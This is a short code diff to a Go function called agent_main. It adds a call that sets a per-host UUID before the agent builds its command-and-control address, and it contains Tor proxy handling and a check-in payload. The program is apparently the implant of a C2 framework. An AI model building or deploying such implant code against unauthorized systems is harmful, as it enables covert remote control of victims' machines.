@@ -124,6 +124,10 @@ func agent_main() {
 		}
 	}
 
+	// Multi-host mode: mint/restore the per-host UUID BEFORE anything
+	// consumes RuntimeConfig.AgentUUID (Tag, sysinfo, checkin payload).
+	agentutils.ApplyHostIdentity()
+
 	// Construct CC address
 	// if CC is behind tor, a proxy is needed
 	if netutil.IsTor(def.CCAddress) {
